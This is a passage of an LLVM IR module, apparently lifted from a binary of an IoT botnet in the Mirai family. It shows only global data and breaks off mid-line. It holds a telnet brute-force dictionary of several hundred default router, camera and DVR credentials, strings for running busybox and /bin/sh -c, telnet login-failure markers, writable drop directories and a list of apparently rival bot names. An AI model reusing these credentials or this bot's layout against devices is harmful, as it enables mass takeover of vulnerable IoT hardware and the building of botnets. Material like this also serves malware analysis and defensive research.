source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_100000a4.1 = constant i32 1208024261
@global_var_1002400c.3 = global i32 0
@global_var_1002401c.4 = local_unnamed_addr global i32* @global_var_1002400c.3
@global_var_10010000.5 = constant [62 x i8] c"537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_10024ab0.8 = global i32 0
@global_var_10024010.9 = global i32 0
@global_var_10024ac8.10 = global i32 0
@global_var_10024acc.11 = local_unnamed_addr global i32 0
@global_var_10024ad0.12 = local_unnamed_addr global i32 0
@global_var_100246b0.13 = local_unnamed_addr global i32 4095
@global_var_100246ac.14 = local_unnamed_addr global i32 362436
@global_var_10011880.15 = constant [7 x i8] c"(null)\00"
@global_var_10024a4c.16 = local_unnamed_addr global i32 0
@global_var_100013c0.17 = constant i32 1207985213
@global_var_1000140c.18 = constant i32 939589631
@global_var_10001460.19 = constant i32 1207959608
@global_var_10011888.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_10011890.21 = constant [3 x i8] c"sh\00"
@global_var_10011894.22 = constant [3 x i8] c"-c\00"
@global_var_100014c0.23 = constant [3 x i8] c"8`\00"
@global_var_100014f0.24 = constant i32 1207959576
@global_var_10011898.25 = constant i32 -1
@global_var_10001c38.26 = constant i32 939524126
@global_var_10024a28.27 = local_unnamed_addr global i32 0
@global_var_10011c98.28 = constant [5 x i8] c"PING\00"
@global_var_10001d34.29 = constant i32 939524126
@global_var_10011870.30 = constant [8 x i8] c"busybox\00"
@global_var_10011878.31 = constant i32 603979776
@global_var_1001187c.32 = constant i32 587202560
@global_var_10024670.33 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10011870.30, i32 0, i32 0), i8* bitcast (i32* @global_var_10011878.31 to i8*), i8* bitcast (i32* @global_var_1001187c.32 to i8*)]
@global_var_10011838.34 = constant [7 x i8] c"nvalid\00"
@global_var_10011840.35 = constant [6 x i8] c"ailed\00"
@global_var_10011848.36 = constant [9 x i8] c"ncorrect\00"
@global_var_10011854.37 = constant [6 x i8] c"enied\00"
@global_var_1001185c.38 = constant [5 x i8] c"rror\00"
@global_var_10011864.39 = constant [7 x i8] c"oodbye\00"
@global_var_1001186c.40 = constant [4 x i8] c"bad\00"
@global_var_10024650.41 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10011838.34, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011840.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011848.36, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011854.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001185c.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10011864.39, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001186c.40, i32 0, i32 0)]
@global_var_100024b0.42 = constant i32 939524098
@global_var_100026b8.43 = constant i32 939524097
@global_var_10024a30.44 = global i32 0
@global_var_10024a34.45 = local_unnamed_addr global i32 0
@global_var_10024a5c.46 = local_unnamed_addr global i32 0
@global_var_10002a30.47 = constant i32 939524096
@global_var_10011ca0.48 = constant [6 x i8] c":>%$#\00"
@global_var_10011ca8.53 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_10024a50.54 = local_unnamed_addr global i32 0
@global_var_10003868.55 = constant i32 939524096
@global_var_10003a28.56 = constant i32 939524098
@global_var_10003ae4.57 = constant i32 939524096
@global_var_100117bc.58 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_100117cc.59 = constant [6 x i8] c"/tmp/\00"
@global_var_100117d4.60 = constant [6 x i8] c"/var/\00"
@global_var_100117dc.61 = constant [6 x i8] c"/dev/\00"
@global_var_100117e4.62 = constant [10 x i8] c"/var/run/\00"
@global_var_100117f0.63 = constant [10 x i8] c"/dev/shm/\00"
@global_var_100117fc.64 = constant [6 x i8] c"/mnt/\00"
@global_var_10011804.65 = constant [7 x i8] c"/boot/\00"
@global_var_1001180c.66 = constant [6 x i8] c"/usr/\00"
@global_var_10011814.67 = constant [6 x i8] c"/opt/\00"
@global_var_10024610.68 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_100117bc.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117cc.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117d4.60, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117dc.61, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100117e4.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100117f0.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100117fc.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10011804.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001180c.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011814.67, i32 0, i32 0)]
@global_var_10011d28.69 = constant i32 -57540
@global_var_10003f34.70 = constant i32 1207962236
@global_var_10003f54.71 = constant i32 1207962204
@global_var_10010ca4.83 = constant [7 x i8] c"telnet\00"
@global_var_10010cac.84 = constant [5 x i8] c"root\00"
@global_var_10010cb4.85 = constant [8 x i8] c"default\00"
@global_var_10010cc0.86 = constant [7 x i8] c"daemon\00"
@global_var_10010cc8.87 = constant [8 x i8] c"support\00"
@global_var_10010cd4.88 = constant i32 0
@global_var_10010cd8.89 = constant [7 x i8] c"123456\00"
@global_var_10010ce0.90 = constant [7 x i8] c"Zte521\00"
@global_var_10010ce8.91 = constant [6 x i8] c"vizxv\00"
@global_var_10010cf0.92 = constant [8 x i8] c"support\00"
@global_var_10010d00.93 = constant [6 x i8] c"admin\00"
@global_var_10010d08.94 = constant [7 x i8] c"camera\00"
@global_var_10010d10.95 = constant [5 x i8] c"1234\00"
@global_var_10010d18.96 = constant [10 x i8] c"fliradmin\00"
@global_var_10010d24.97 = constant [4 x i8] c"jvc\00"
@global_var_10010d2c.98 = constant [8 x i8] c"meinsma\00"
@global_var_10010d38.99 = constant [9 x i8] c"password\00"
@global_var_10010d44.100 = constant [11 x i8] c"supervisor\00"
@global_var_10010d50.101 = constant [9 x i8] c"backdoor\00"
@global_var_10010d5c.102 = constant [7 x i8] c"atc123\00"
@global_var_10010d64.103 = constant [7 x i8] c"ascend\00"
@global_var_10010d6c.104 = constant [11 x i8] c"epicrouter\00"
@global_var_10010d78.105 = constant [5 x i8] c"none\00"
@global_var_10010d80.106 = constant [9 x i8] c"1234User\00"
@global_var_10010d8c.107 = constant [12 x i8] c"5678Service\00"
@global_var_10010d9c.108 = constant [9 x i8] c"atlantis\00"
@global_var_10010da8.109 = constant [8 x i8] c"ROOT500\00"
@global_var_10010db4.110 = constant [7 x i8] c"xxyyzz\00"
@global_var_10010dbc.111 = constant [7 x i8] c"danger\00"
@global_var_10010dc4.112 = constant [7 x i8] c"crftpw\00"
@global_var_10010dcc.113 = constant [7 x i8] c"cms500\00"
@global_var_10010dd4.114 = constant [15 x i8] c"ggdaseuaimhrke\00"
@global_var_10010de4.115 = constant [8 x i8] c"tslinux\00"
@global_var_10010df0.116 = constant [5 x i8] c"pass\00"
@global_var_10010df8.117 = constant [7 x i8] c"NetICs\00"
@global_var_10010e00.118 = constant [9 x i8] c"security\00"
@global_var_10010e0c.119 = constant [7 x i8] c"friend\00"
@global_var_10010e14.120 = constant [8 x i8] c"manager\00"
@global_var_10010e20.121 = constant [7 x i8] c"bintec\00"
@global_var_10010e28.122 = constant [8 x i8] c"articon\00"
@global_var_10010e34.123 = constant [7 x i8] c"patrol\00"
@global_var_10010e3c.124 = constant [8 x i8] c"service\00"
@global_var_10010e48.125 = constant [5 x i8] c"tech\00"
@global_var_10010e50.126 = constant [5 x i8] c"live\00"
@global_var_10010e58.127 = constant [7 x i8] c"Master\00"
@global_var_10010e60.128 = constant [7 x i8] c"laflaf\00"
@global_var_10010e68.129 = constant [9 x i8] c"Helpdesk\00"
@global_var_10010e74.130 = constant [6 x i8] c"Super\00"
@global_var_10010e7c.131 = constant [10 x i8] c"installer\00"
@global_var_10010e88.132 = constant [9 x i8] c"fivranne\00"
@global_var_10010e94.133 = constant [9 x i8] c"webadmin\00"
@global_var_10010ea0.134 = constant [9 x i8] c"Serv4EMC\00"
@global_var_10010eac.135 = constant [7 x i8] c"access\00"
@global_var_10010eb4.136 = constant [9 x i8] c"netadmin\00"
@global_var_10010ec0.137 = constant [9 x i8] c"mediator\00"
@global_var_10010ecc.138 = constant [8 x i8] c"Mau'dib\00"
@global_var_10010ed8.139 = constant [7 x i8] c"cellit\00"
@global_var_10010ee0.140 = constant [8 x i8] c"diamond\00"
@global_var_10010eec.141 = constant [10 x i8] c"1234admin\00"
@global_var_10010ef8.142 = constant [9 x i8] c"changeme\00"
@global_var_10010f04.143 = constant [7 x i8] c"attack\00"
@global_var_10010f0c.144 = constant [7 x i8] c"cmaker\00"
@global_var_10010f14.145 = constant [18 x i8] c"changeme2database\00"
@global_var_10010f28.146 = constant [5 x i8] c"NULL\00"
@global_var_10010f30.147 = constant [6 x i8] c"Cisco\00"
@global_var_10010f38.148 = constant [6 x i8] c"cisco\00"
@global_var_10010f40.149 = constant [8 x i8] c"blender\00"
@global_var_10010f4c.150 = constant [7 x i8] c"hsasdb\00"
@global_var_10010f54.151 = constant [7 x i8] c"wlsedb\00"
@global_var_10010f5c.152 = constant [13 x i8] c"wlsepassword\00"
@global_var_10010f6c.153 = constant [7 x i8] c"system\00"
@global_var_10010f74.154 = constant [8 x i8] c"cgadmin\00"
@global_var_10010f80.155 = constant [5 x i8] c"surt\00"
@global_var_10010f88.156 = constant [5 x i8] c"tini\00"
@global_var_10010f90.157 = constant [5 x i8] c"any@\00"
@global_var_10010f98.158 = constant [6 x i8] c"davox\00"
@global_var_10010fa0.159 = constant [7 x i8] c"calvin\00"
@global_var_10010fa8.160 = constant [10 x i8] c"my_DEMARC\00"
@global_var_10010fb4.161 = constant [8 x i8] c"MServer\00"
@global_var_10010fc0.162 = constant [4 x i8] c"PBX\00"
@global_var_10010fc8.163 = constant [8 x i8] c"NETWORK\00"
@global_var_10010fd4.164 = constant [7 x i8] c"BRIDGE\00"
@global_var_10010fdc.165 = constant [14 x i8] c"michaelangelo\00"
@global_var_10010fec.166 = constant [13 x i8] c"wrgg15_di524\00"
@global_var_10010ffc.167 = constant [9 x i8] c"firmware\00"
@global_var_10011008.168 = constant [10 x i8] c"1234Admin\00"
@global_var_10011014.169 = constant [11 x i8] c"software01\00"
@global_var_10011020.170 = constant [15 x i8] c"Administration\00"
@global_var_10011030.171 = constant [8 x i8] c"su@psir\00"
@global_var_1001103c.172 = constant [8 x i8] c"4getme2\00"
@global_var_10011048.173 = constant [9 x i8] c"tiger123\00"
@global_var_10011054.174 = constant [5 x i8] c"help\00"
@global_var_1001105c.175 = constant [10 x i8] c"extendnet\00"
@global_var_10011068.176 = constant [8 x i8] c"Exabyte\00"
@global_var_10011074.177 = constant [9 x i8] c"Posterie\00"
@global_var_10011080.178 = constant [8 x i8] c"!manage\00"
@global_var_1001108c.179 = constant [7 x i8] c"radius\00"
@global_var_10011094.180 = constant [9 x i8] c"nimdaten\00"
@global_var_100110a0.181 = constant [5 x i8] c"isee\00"
@global_var_100110a8.182 = constant [11 x i8] c"56789Admin\00"
@global_var_100110b4.183 = constant [11 x i8] c"specialist\00"
@global_var_100110c0.184 = constant [7 x i8] c"public\00"
@global_var_100110c8.185 = constant [7 x i8] c"secret\00"
@global_var_100110d0.186 = constant [7 x i8] c"abc123\00"
@global_var_100110d8.187 = constant [10 x i8] c"P@55w0rd!\00"
@global_var_100110e4.188 = constant [8 x i8] c"iDirect\00"
@global_var_100110f0.189 = constant [6 x i8] c"pilou\00"
@global_var_100110f8.190 = constant [6 x i8] c"setup\00"
@global_var_10011100.191 = constant [6 x i8] c"hello\00"
@global_var_10011108.192 = constant [9 x i8] c"adslroot\00"
@global_var_10011114.193 = constant [14 x i8] c"administrator\00"
@global_var_10011124.194 = constant [14 x i8] c"Administrator\00"
@global_var_10011134.195 = constant [7 x i8] c"0Admin\00"
@global_var_1001113c.196 = constant [9 x i8] c"123Admin\00"
@global_var_10011148.197 = constant [12 x i8] c"123456Admin\00"
@global_var_10011158.198 = constant [14 x i8] c"123456special\00"
@global_var_10011168.199 = constant [10 x i8] c"superuser\00"
@global_var_10011174.200 = constant [8 x i8] c"admin00\00"
@global_var_10011180.201 = constant [8 x i8] c"orion99\00"
@global_var_1001118c.202 = constant [8 x i8] c"tivonpw\00"
@global_var_10011198.203 = constant [7 x i8] c"Ascend\00"
@global_var_100111a0.204 = constant [6 x i8] c"super\00"
@global_var_100111a8.205 = constant [12 x i8] c"lucenttech1\00"
@global_var_100111b8.206 = constant [13 x i8] c"AitbISP4eCiG\00"
@global_var_100111c8.207 = constant [6 x i8] c"smile\00"
@global_var_100111d0.208 = constant [7 x i8] c"router\00"
@global_var_100111d8.209 = constant [9 x i8] c"motorola\00"
@global_var_100111e4.210 = constant [7 x i8] c"sysadm\00"
@global_var_100111ec.211 = constant [7 x i8] c"NetVCR\00"
@global_var_100111f4.212 = constant [11 x i8] c"xdfk9874t3\00"
@global_var_10011200.213 = constant [5 x i8] c"4tas\00"
@global_var_10011208.214 = constant [6 x i8] c"maint\00"
@global_var_10011210.215 = constant [6 x i8] c"m1122\00"
@global_var_10011218.216 = constant [8 x i8] c"3ep5w2u\00"
@global_var_10011224.217 = constant [9 x i8] c"ntacdmax\00"
@global_var_10011230.218 = constant [9 x i8] c"PlsChgMe\00"
@global_var_1001123c.219 = constant [8 x i8] c"private\00"
@global_var_10011248.220 = constant [14 x i8] c"smallbusiness\00"
@global_var_10011258.221 = constant [3 x i8] c"mu\00"
@global_var_1001125c.222 = constant [14 x i8] c"microbusiness\00"
@global_var_1001126c.223 = constant [8 x i8] c"pfsense\00"
@global_var_10011278.224 = constant [8 x i8] c"hawk201\00"
@global_var_10011284.225 = constant [8 x i8] c"h179350\00"
@global_var_10011290.226 = constant [3 x i8] c"lp\00"
@global_var_10011294.227 = constant [8 x i8] c"radware\00"
@global_var_100112a0.228 = constant [9 x i8] c"trancell\00"
@global_var_100112ac.229 = constant [10 x i8] c"Col2ogro2\00"
@global_var_100112b8.230 = constant [9 x i8] c"p1nacate\00"
@global_var_100112c4.231 = constant [7 x i8] c"col1ma\00"
@global_var_100112cc.232 = constant [10 x i8] c"d1scovery\00"
@global_var_100112d8.233 = constant [6 x i8] c"w2402\00"
@global_var_100112e0.234 = constant [6 x i8] c"Sharp\00"
@global_var_100112e8.235 = constant [9 x i8] c"engineer\00"
@global_var_100112f4.236 = constant [8 x i8] c"ganteng\00"
@global_var_10011300.237 = constant [9 x i8] c"smcadmin\00"
@global_var_1001130c.238 = constant [10 x i8] c"barricade\00"
@global_var_10011318.239 = constant [10 x i8] c"highspeed\00"
@global_var_10011324.240 = constant [15 x i8] c"w0rkplac3rul3s\00"
@global_var_10011334.241 = constant [11 x i8] c"stratauser\00"
@global_var_10011340.242 = constant [6 x i8] c"Admin\00"
@global_var_10011348.243 = constant [8 x i8] c"mysweex\00"
@global_var_10011354.244 = constant [7 x i8] c"symbol\00"
@global_var_1001135c.245 = constant [8 x i8] c"mercury\00"
@global_var_10011368.246 = constant [9 x i8] c"truetime\00"
@global_var_10011374.247 = constant [11 x i8] c"12345Admin\00"
@global_var_10011380.248 = constant [7 x i8] c"master\00"
@global_var_10011388.249 = constant [5 x i8] c"xbox\00"
@global_var_10011390.250 = constant [10 x i8] c"tellabs#1\00"
@global_var_1001139c.251 = constant [8 x i8] c"admin_1\00"
@global_var_100113a8.252 = constant [7 x i8] c"talent\00"
@global_var_100113b0.253 = constant [8 x i8] c"imss7.0\00"
@global_var_100113bc.254 = constant [8 x i8] c"detmond\00"
@global_var_100113c8.255 = constant [10 x i8] c"1111Admin\00"
@global_var_100113d4.256 = constant [11 x i8] c"22222Admin\00"
@global_var_100113e0.257 = constant [8 x i8] c"x-admin\00"
@global_var_100113ec.258 = constant [7 x i8] c"switch\00"
@global_var_100113f4.259 = constant [9 x i8] c"zoomadsl\00"
@global_var_10011400.260 = constant [9 x i8] c"expert03\00"
@global_var_1001140c.261 = constant [5 x i8] c"anko\00"
@global_var_10011414.262 = constant [11 x i8] c"oelinux123\00"
@global_var_10011420.263 = constant [7 x i8] c"alpine\00"
@global_var_10011428.264 = constant [8 x i8] c"maxided\00"
@global_var_10011434.265 = constant [10 x i8] c"raspberry\00"
@global_var_10011440.266 = constant [8 x i8] c"vagrant\00"
@global_var_1001144c.267 = constant [6 x i8] c"zlxx.\00"
@global_var_10011454.268 = constant [9 x i8] c"juantech\00"
@global_var_10011460.269 = constant [7 x i8] c"avtech\00"
@global_var_10011468.270 = constant [7 x i8] c"xc3511\00"
@global_var_10011470.271 = constant [7 x i8] c"666666\00"
@global_var_10011478.272 = constant [7 x i8] c"888888\00"
@global_var_10011480.273 = constant [7 x i8] c"111111\00"
@global_var_10011488.274 = constant [9 x i8] c"bayandsl\00"
@global_var_10011494.275 = constant [12 x i8] c"12345676890\00"
@global_var_100114a4.276 = constant [11 x i8] c"1234567890\00"
@global_var_100114b0.277 = constant [13 x i8] c"admintelecom\00"
@global_var_100114c0.278 = constant [13 x i8] c"telecomadmin\00"
@global_var_100114d0.279 = constant [7 x i8] c"comcom\00"
@global_var_100114d8.280 = constant [8 x i8] c"zte9x15\00"
@global_var_100114e4.281 = constant [6 x i8] c"ZXDSL\00"
@global_var_100114ec.282 = constant [7 x i8] c"D-Link\00"
@global_var_100114f4.283 = constant [6 x i8] c"dlink\00"
@global_var_100114fc.284 = constant [6 x i8] c"DLink\00"
@global_var_10011504.285 = constant [12 x i8] c"asteriskftp\00"
@global_var_10011514.286 = constant [9 x i8] c"dreambox\00"
@global_var_10011520.287 = constant [5 x i8] c"1111\00"
@global_var_10011528.288 = constant [6 x i8] c"12345\00"
@global_var_10011530.289 = constant [6 x i8] c"54321\00"
@global_var_10011538.290 = constant [7 x i8] c"fucker\00"
@global_var_10011540.291 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_10011550.292 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_10011560.293 = constant [7 x i8] c"hi3518\00"
@global_var_10011568.294 = constant [7 x i8] c"klv123\00"
@global_var_10011570.295 = constant [8 x i8] c"klv1234\00"
@global_var_1001157c.296 = constant [8 x i8] c"realtek\00"
@global_var_10011588.297 = constant [6 x i8] c"jvbzd\00"
@global_var_10011590.298 = constant [8 x i8] c"xmhdipc\00"
@global_var_1001159c.299 = constant [9 x i8] c"openlgtv\00"
@global_var_100115a8.300 = constant [8 x i8] c"root123\00"
@global_var_100115b4.301 = constant [9 x i8] c"ahetzip8\00"
@global_var_100115c0.302 = constant [7 x i8] c"696969\00"
@global_var_100115c8.303 = constant [9 x i8] c"pa55w0rd\00"
@global_var_100115d4.304 = constant [7 x i8] c"123123\00"
@global_var_100115dc.305 = constant [9 x i8] c"b120root\00"
@global_var_100115e8.306 = constant [9 x i8] c"PASSWORD\00"
@global_var_100115f4.307 = constant [6 x i8] c"ADMIN\00"
@global_var_100115fc.308 = constant [8 x i8] c"netgear\00"
@global_var_10011608.309 = constant [7 x i8] c"vyatta\00"
@global_var_10011610.310 = constant [7 x i8] c"atc456\00"
@global_var_10011618.311 = constant [7 x i8] c"micros\00"
@global_var_10011620.312 = constant [8 x i8] c"comcast\00"
@global_var_1001162c.313 = constant [4 x i8] c"pos\00"
@global_var_10011634.314 = constant [4 x i8] c"www\00"
@global_var_1001163c.315 = constant [5 x i8] c"2800\00"
@global_var_10011644.316 = constant [5 x i8] c"UBNT\00"
@global_var_1001164c.317 = constant [9 x i8] c"00000000\00"
@global_var_10011658.318 = constant [5 x i8] c"user\00"
@global_var_10011660.319 = constant [5 x i8] c"ikwb\00"
@global_var_10011668.320 = constant [5 x i8] c"ubnt\00"
@global_var_10011670.321 = constant [4 x i8] c"buh\00"
@global_var_10011678.322 = constant [7 x i8] c"utstar\00"
@global_var_10011680.323 = constant [9 x i8] c"99999999\00"
@global_var_1001168c.324 = constant [6 x i8] c"Meins\00"
@global_var_10011694.325 = constant [4 x i8] c"JVC\00"
@global_var_1001169c.326 = constant [5 x i8] c"ip20\00"
@global_var_100116a4.327 = constant [7 x i8] c"ip3000\00"
@global_var_100116ac.328 = constant [6 x i8] c"ip400\00"
@global_var_100116b4.329 = constant [8 x i8] c"tsunami\00"
@global_var_100116c0.330 = constant [7 x i8] c"2601hx\00"
@global_var_100116c8.331 = constant [7 x i8] c"synnet\00"
@global_var_100116d0.332 = constant [6 x i8] c"quser\00"
@global_var_100116d8.333 = constant [8 x i8] c"Manager\00"
@global_var_100116e4.334 = constant [8 x i8] c"netopia\00"
@global_var_100116f0.335 = constant [8 x i8] c"anicust\00"
@global_var_100116fc.336 = constant [10 x i8] c"d.e.b.u.g\00"
@global_var_10011708.337 = constant [5 x i8] c"echo\00"
@global_var_10011710.338 = constant [5 x i8] c"demo\00"
@global_var_10011718.339 = constant [7 x i8] c"client\00"
@global_var_10011720.340 = constant [6 x i8] c"CISCO\00"
@global_var_10011728.341 = constant [8 x i8] c"7654321\00"
@global_var_10011734.342 = constant [9 x i8] c"adsl1234\00"
@global_var_10011740.343 = constant [5 x i8] c"toor\00"
@global_var_10011748.344 = constant [9 x i8] c"adminttd\00"
@global_var_10011754.345 = constant [9 x i8] c"PlcmSpIp\00"
@global_var_10011760.346 = constant [9 x i8] c"11111111\00"
@global_var_1001176c.347 = constant [9 x i8] c"22222222\00"
@global_var_10011778.348 = constant [9 x i8] c"mountsys\00"
@global_var_10011784.349 = constant [14 x i8] c"LSiuY7pOmZG2s\00"
@global_var_10011794.350 = constant [15 x i8] c"3UJUh2VemEfUte\00"
@global_var_100117a4.351 = constant [11 x i8] c"Muse!Admin\00"
@global_var_100117b0.352 = constant [10 x i8] c"changeme2\00"
@global_var_10011d48.377 = constant [6 x i8] c"arfgG\00"
@global_var_10011d50.378 = constant [9 x i8] c"HBiug655\00"
@global_var_10011d5c.379 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_10011d6c.380 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_10011d80.381 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_10011d94.382 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10011da0.383 = constant [12 x i8] c"RYSDk747586\00"
@global_var_10011dac.384 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_10011db8.385 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10011dc4.386 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10011dd0.387 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_10011de0.388 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_10011dec.389 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_10011dfc.390 = constant [9 x i8] c"ewqdcftr\00"
@global_var_10011e08.391 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_10011e18.392 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_10011e24.393 = constant [12 x i8] c"twehgbferhb\00"
@global_var_10011e30.394 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_10011e3c.395 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_10011e4c.396 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_10011e5c.397 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_10011e6c.398 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_10011e78.399 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_10011e88.400 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_10011e98.401 = constant [12 x i8] c"yteytietyue\00"
@global_var_10011ea4.402 = constant [9 x i8] c"qsortEQS\00"
@global_var_10011eb0.403 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10011ec0.404 = constant [4 x i8] c"std\00"
@global_var_10011ec4.405 = constant [4 x i8] c"dts\00"
@global_var_10011ec8.406 = constant [4 x i8] c"lsk\00"
@global_var_10011ecc.407 = constant [4 x i8] c"kek\00"
@global_var_10011ed0.408 = constant [6 x i8] c"smack\00"
@global_var_10011ed8.409 = constant [4 x i8] c"ily\00"
@global_var_10011edc.410 = constant [4 x i8] c"tyf\00"
@global_var_10011ee0.411 = constant [4 x i8] c"pos\00"
@global_var_10011ee4.412 = constant [6 x i8] c"cunts\00"
@global_var_10011eec.413 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011d48.377, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011d50.378, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10011d5c.379, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10011d6c.380, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10011d80.381, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011d94.382, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011da0.383, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011dac.384, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10011db8.385, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10011dc4.386, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011dd0.387, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011de0.388, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10011dec.389, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011dfc.390, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10011e08.391, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10011e18.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011e24.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011e30.394, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e3c.395, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e4c.396, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e5c.397, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10011e6c.398, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e78.399, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011e88.400, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011e98.401, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011ea4.402, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10011eb0.403, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ec0.404, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ec4.405, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ec8.406, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ecc.407, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011ed0.408, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ed8.409, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011edc.410, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011ee0.411, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011ee4.412, i32 0, 